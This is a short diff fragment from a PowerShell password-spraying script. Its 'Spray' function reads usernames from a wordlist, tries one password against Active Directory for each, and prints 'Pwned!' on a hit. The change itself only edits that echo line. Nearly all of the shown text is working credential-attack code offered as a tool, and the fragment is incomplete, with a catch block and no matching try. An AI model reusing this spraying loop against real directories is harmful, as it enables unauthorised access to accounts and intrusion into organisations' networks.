@@ -10,7 +10,7 @@ function Spray {
     foreach ($uname in [System.IO.File]::ReadLines($wordlist)){
     if (Test-ADAuth -username $uname -password $pass)
     {
-        echo $uname + ' [*] Pwned!'
+        echo $uname ' [*] Pwned!'
     }
      catch 
     {
